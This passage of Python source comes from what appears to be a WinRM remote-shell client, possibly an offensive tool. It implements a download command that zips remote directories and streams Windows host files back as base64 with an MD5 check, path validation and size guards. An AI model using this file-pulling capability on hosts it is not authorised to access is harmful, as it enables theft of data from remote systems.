        if ".." in stripped:
            raise ValueError(
                f"Remote path contains directory traversal sequences: {stripped!r}"
            )
        if not (cls._SAFE_WINPATH.match(stripped) or cls._SAFE_UNCPATH.match(stripped)):
            raise ValueError(
                f"Remote path failed safety validation: {stripped!r}\n"
                "  The WinRM server returned a path containing unsafe or injection characters."
            )
        return stripped

    # ── !download (FIX-01, FIX-03, FIX-07, OPT-07) ────────────────────────────
    def download(self, cmdline: str):
        args = split_args(cmdline)
        if not args or len(args) > 2:
            self.write_warning("usage: !download RPATH [LPATH]"); return

        # [FIX-03] Always derive default local filename from user-supplied RPATH
        user_rpath = PureWindowsPath(args[0])
        safe_filename = user_rpath.name or "downloaded_file"

        src_raw = self.run_sync(f"Resolve-Path -LiteralPath '{self._pse(args[0])}' | Select -Expand Path")
        if not src_raw:
            self.write_warning(f"{args[0]} not found on remote"); return

        try:
            src_validated = self._validate_remote_path(src_raw)
        except ValueError as e:
            self.write_error(str(e)); return

        src    = PureWindowsPath(src_validated)
        src_ps = self._pse(src)
        src_pde = self._pde(src)

        dst = Path(args[1]) if len(args) == 2 else Path(safe_filename)
        if dst.is_dir(): 
            dst = dst / safe_filename

        dst_resolved = dst.resolve()
        cwd_resolved = Path.cwd().resolve()

        # Path traversal guard for relative local paths
        if len(args) < 2 and not str(dst_resolved).startswith(str(cwd_resolved)):
            self.write_error(f"Refusing path outside CWD: {dst_resolved}")
            return

        if not dst.parent.exists(): 
            os.makedirs(dst.parent, exist_ok=True)

        is_dir = self.run_sync(f"Test-Path -LiteralPath '{src_ps}' -PathType Container") == "True"
        if is_dir:
            if not dst.name.lower().endswith(".zip"): 
                dst = dst.parent / f"{dst.name}.zip"
                
            tmpdir_raw = self.run_sync("[System.IO.Path]::GetTempPath()").strip()
            try:
                tmpdir_validated = self._validate_remote_path(tmpdir_raw)
            except ValueError:
                tmpdir_validated = "C:\\Windows\\Temp\\"
            tmpdir    = tmpdir_validated
            tmpnm     = secrets.token_hex(8)
            tmpfn     = tmpdir + tmpnm
            tmpdir_ps = self._pse(tmpdir)
            tmpfn_ps  = self._pse(tmpfn)
            tmpfn_pde = self._pde(tmpfn)

            ps = f"""
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
New-Item -Path '{tmpdir_ps}' -ItemType Directory -Name '{tmpnm}' | Out-Null
Get-ChildItem -Force -Recurse -LiteralPath '{src_ps}' | ForEach-Object {{
    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
        try {{
            $d = $_.FullName.Replace('{src_ps}', '')
            Copy-Item -ErrorAction SilentlyContinue -Force -LiteralPath $_.FullName "{tmpfn_pde}\\$d"
        }} catch {{ Write-Warning "skipping $d" }}
    }}
}}
{_importPathFix}
[IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn_ps}', '{tmpfn_ps}.zip',
    [IO.Compression.CompressionLevel]::Fastest, $true, ${_new_PathFix})
Remove-Item -Recurse -Force -LiteralPath '{tmpfn_ps}'
"""
            self.run_with_interrupt(ps, self.write_line)
            src    = tmpfn + ".zip"
            src_ps = self._pse(src)

        ps = f"""function Download-Remote {{
    $h = Get-FileHash -LiteralPath '{src_ps}' -Algorithm MD5 | Select -Expand Hash;
    $f = [System.IO.File]::OpenRead('{src_ps}');
    $b = New-Object byte[] 65536;
    while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
    $f.Close();
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
}}
Download-Remote
Remove-Item Function:Download-Remote
"""
        self.write_info(f"  [~] Streaming {c(C,str(src))} ...")
        buf = bytearray()
        max_bytes = int(os.environ.get("PWNRM_MAX_DL", 256 * 1024 * 1024))

        def collect(out):
            if part := out.get("stdout"):
                try:
                    chunk = b64decode(part)
                    if len(buf) + len(chunk) > max_bytes:
                        raise RuntimeError(f"OOM guard: stream exceeds {max_bytes} bytes")
                    buf.extend(chunk)  # [FIX-01] in-place accumulation on shared bytearray
                    self.write_progress(f"Download {len(buf)} bytes")
                except RuntimeError as e:
                    self.write_error(str(e))
                    raise e
                except Exception:
                    self.write_warning("Received malformed Base64 chunk from server (skipped)")

        self.run_with_interrupt(ps, collect)

        if is_dir: self.run_sync(f"Remove-Item -Force -LiteralPath '{src_ps}'")

        if len(buf) == 0:
            self.write_error(
                "  Download failed: no data received from server "
                "(empty stream or collection failure)."
            )
            return

        if len(buf) < 32:
            self.write_error(
                f"  Download failed: server returned {len(buf)} bytes "
                "(expected at least 32-byte MD5 trailer)."
            )
            return

        expected_md5 = MD5.new(buf[:-32]).hexdigest().upper().encode()
        if buf[-32:] != expected_md5:
            buf[:] = b'\x00' * len(buf)  # [OPT-07] zeroize sensitive buffer in memory
            self.write_error("  Download integrity check FAILED — file corrupted or tampered!")
            return
            
        self.write_info(f"  [+] Writing {c(G,str(dst.resolve()))}")
        try:
            with open(dst,"wb") as f: f.write(buf[:-32])
        except IOError as e:
            self.write_error(str(e))